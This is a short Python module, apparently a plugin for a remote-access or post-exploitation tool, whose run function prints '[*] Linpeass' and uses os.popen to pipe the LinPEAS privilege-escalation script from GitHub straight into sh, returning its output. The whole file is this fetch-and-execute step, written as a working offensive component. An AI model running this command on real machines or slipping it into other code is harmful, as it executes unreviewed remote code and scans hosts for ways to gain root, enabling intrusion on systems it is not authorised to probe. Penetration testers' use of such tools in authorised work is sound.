import os

def run(**args):
    print("[*] Linpeass")
    return os.popen("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh").read().encode()
